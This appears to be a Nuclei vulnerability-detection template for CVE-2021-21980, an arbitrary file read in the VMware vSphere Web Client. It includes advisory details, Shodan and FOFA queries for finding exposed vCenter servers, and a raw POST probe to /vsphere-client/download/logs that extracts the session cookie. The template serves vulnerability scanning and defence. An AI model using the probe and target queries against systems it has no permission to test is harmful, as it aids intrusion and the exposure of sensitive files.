id: CVE-2021-21980

info:
  name: VMware vSphere Web Client (FLEX/Flash) - Arbitrary File Read
  author: princechaddha
  severity: high
  description: |
    VMware vSphere Web Client (FLEX/Flash) contains an unauthorized arbitrary file read vulnerability. A malicious actor with network access to port 443 on vCenter Server may exploit this issue to gain access to sensitive information. This vulnerability affects vCenter Server 6.5 before 6.5 U3r, 6.7 before 6.7 U3p, and VMware Cloud Foundation 3.x.
  impact: |
    Successful exploitation allows attackers to read arbitrary files from the vCenter Server, potentially exposing sensitive configuration data, credentials, and other critical information.
  remediation: |
    Upgrade to vCenter Server 6.5 U3r, 6.7 U3p or later. Alternatively, disable the legacy Flash-based vSphere Web Client and use the HTML5 client exclusively.
  reference:
    - https://www.vmware.com/security/advisories/VMSA-2021-0027.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-21980
    - https://attackerkb.com/topics/5nZX40suYA/cve-2021-21980
    - https://github.com/Osyanina/westone-CVE-2021-21980-scanner
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-21980
    cwe-id: CWE-22
    epss-score: 0.00653
    epss-percentile: 0.79162
    cpe: cpe:2.3:a:vmware:vcenter_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: vmware
    product: vcenter_server
    shodan-query: http.title:"vmware cloud"
    fofa-query: title="VMware vSphere"
  tags: cve2021,cve,vmware,vcenter,lfi,kev,file-read,vkev,vuln

http:
  - raw:
      - |
        POST /vsphere-client/download/logs HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        webClientSessionId={{rand_base(8)}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(tolower(header), "jsessionid")'
          - 'contains(tolower(header), "vsphere-client")'
        condition: and

      - type: word
        part: header
        words:
          - "SameSite=None"
          - "HttpOnly"
        condition: and

    extractors:
      - type: regex
        name: session
        part: header
        group: 1
        regex:
          - 'JSESSIONID=([A-Z0-9]+)'
